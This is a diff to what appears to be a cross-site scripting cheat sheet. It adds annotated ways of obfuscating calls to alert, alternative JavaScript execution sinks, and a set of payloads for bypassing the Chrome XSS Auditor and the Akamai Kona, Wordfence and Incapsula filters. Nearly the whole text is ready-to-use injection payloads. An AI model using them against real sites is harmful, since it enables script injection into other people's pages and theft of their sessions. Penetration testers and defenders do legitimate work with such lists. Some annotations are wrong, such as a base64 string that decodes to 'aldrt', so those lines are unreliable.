@@ -124,8 +124,73 @@ eval('\a\l\e\rt(\1\)')
 ```
 alert
 /ale/.source+/rt/.source
-String.fromCharCode(97,108,101,114,116)
-atob("YWxkcnQ=")
-17795081..toString(36)
+String.fromCharCode(97,108,101,114,116)    #Hex unicode encoding
+atob("YWxkcnQ=")                           #Base64 paylad
+17795081..toString(36)                     #Convert the number on the left to a base36 string
 ```
 
+#### Alternatives function sinks
+
+```
+setTimeout
+setInterval
+Function
+[].constructor.constructor("[code]")
+```
+
+### Sanification Bypass
+
+
+
+
+
+## WAF Bypass
+
+### Google Chrome Payloads
+
+#### Google XSS Audit Bypass
+
+```
+<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
+```
+
+#### Chrome < v60 beta XSS-Auditor Bypass
+
+```
+<script src="data:,alert(1)%250A-->
+```
+
+#### Other Google Audit Bypass Payloads
+
+```
+<script>alert(1)</script
+<script>alert(1)%0d%0a-->%09</script
+<x>%00%00%00%00%00%00%00<script>alert(1)</script>
+```
+
+### Safari
+
+```
+<script>location.href;'javascript:alert%281%29'</script>
+```
+
+### Kona WAF (Akamai) Bypass&#xD;
+
+```
+<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
+```
+
+### Wordfence&#x20;
+
+```
+<meter onmouseover="alert(1)"
+'">><div><meter onmouseover="alert(1)"</div>"
+>><marquee loop=1 width=0 onfinish=alert(1)>
+```
+
+### Incapsula WAF
+
+```
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+<img/src=q onerror='new Function`al\ert\`1\``'>
+```
